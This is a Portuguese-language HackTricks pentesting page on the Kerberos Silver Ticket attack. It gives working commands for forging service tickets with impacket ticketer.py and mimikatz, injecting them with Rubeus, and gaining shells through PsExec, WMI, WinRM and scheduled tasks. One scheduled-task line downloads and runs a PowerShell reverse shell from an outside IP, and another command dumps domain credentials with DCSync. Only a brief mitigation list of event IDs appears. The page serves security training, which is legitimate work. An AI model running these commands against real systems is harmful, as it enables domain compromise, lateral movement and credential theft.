# Silver Ticket

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Trabalha numa **empresa de cibersegurança**? Quer ver a sua **empresa anunciada no HackTricks**? ou quer ter acesso à **versão mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se está interessado numa **carreira em hacking** e em hackear o inquebrável - **estamos contratando!** (_é necessário polonês fluente escrito e falado_).

{% embed url="https://www.stmcyber.com/careers" %}

## Silver ticket

O ataque Silver ticket é baseado em **criar um TGS válido para um serviço uma vez que o hash NTLM do serviço é obtido** (como o **hash da conta do PC**). Assim, é possível **ganhar acesso a esse serviço** forjando um TGS personalizado **como qualquer usuário**.

Neste caso, o **hash NTLM de uma conta de computador** (que é uma espécie de conta de usuário no AD) é **obtido**. Portanto, é possível **criar** um **ticket** para **entrar naquela máquina** com privilégios de **administrador** através do serviço SMB. As contas de computador reiniciam suas senhas a cada 30 dias por padrão.

Também deve ser levado em conta que é possível E **PREFERÍVEL** (opsec) **forjar tickets usando as chaves AES Kerberos (AES128 e AES256)**. Para saber como gerar uma chave AES leia: [seção 4.4 do MS-KILE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625) ou o [Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372).

{% code title="Linux" %}
```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
```
```markdown
No Windows, **Mimikatz** pode ser usado para **criar** o **ticket**. Em seguida, o ticket é **injetado** com **Rubeus**, e finalmente um shell remoto pode ser obtido graças ao **PsExec**.

{% code title="Windows" %}
```
```bash
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

#Example using aes key
kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
```
{% endcode %}

O serviço **CIFS** é o que permite **acessar o sistema de arquivos da vítima**. Você pode encontrar outros serviços aqui: [**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page\_id=183)**.** Por exemplo, você pode usar o serviço **HOST** para criar uma _**schtask**_ em um computador. Em seguida, você pode verificar se isso funcionou tentando listar as tarefas da vítima: `schtasks /S <hostname>` ou você pode usar o serviço **HOST e RPCSS** para executar consultas **WMI** em um computador, teste fazendo: `Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`

### Mitigação

IDs de eventos de Silver ticket (mais discretos que golden ticket):

* 4624: Logon de Conta
* 4634: Logoff de Conta
* 4672: Logon de Admin

[**Mais informações sobre Silver Tickets em ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)

## Serviços Disponíveis

| Tipo de Serviço                            | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Dependendo do SO também:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Em algumas ocasiões você pode simplesmente pedir: WINRM</p> |
| Tarefas Agendadas                          | HOST                                                                       |
| Compartilhamento de Arquivos do Windows, também psexec | CIFS                                                                       |
| Operações LDAP, incluindo DCSync           | LDAP                                                                       |
| Ferramentas de Administração Remota de Servidores Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Usando **Rubeus** você pode **solicitar todos** esses tickets usando o parâmetro:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

## Abusando de Service tickets

Nos seguintes exemplos, vamos imaginar que o ticket é obtido se passando pela conta do administrador.

### CIFS

Com este ticket, você poderá acessar as pastas `C$` e `ADMIN$` via **SMB** (se estiverem expostas) e copiar arquivos para uma parte do sistema de arquivos remoto apenas fazendo algo como:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Você também poderá obter um shell dentro do host ou executar comandos arbitrários usando **psexec**:

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### HOST

Com essa permissão, você pode gerar tarefas agendadas em computadores remotos e executar comandos arbitrários:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Com esses tickets você pode **executar WMI no sistema vítima**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Encontre **mais informações sobre wmiexec** na seguinte página:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Com acesso winrm a um computador, você pode **acessá-lo** e até obter um PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Consulte a seguinte página para aprender **mais formas de conectar-se a um host remoto usando winrm**:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Observe que o **winrm deve estar ativo e ouvindo** no computador remoto para acessá-lo.
{% endhint %}

### LDAP

Com este privilégio, você pode extrair o banco de dados do DC usando **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Saiba mais sobre DCSync** na página a seguir:

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se você tem interesse em **carreira de hacking** e em hackear o inquebrável - **estamos contratando!** (_é necessário polonês fluente, escrito e falado_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **versão mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Adquira o [**material oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
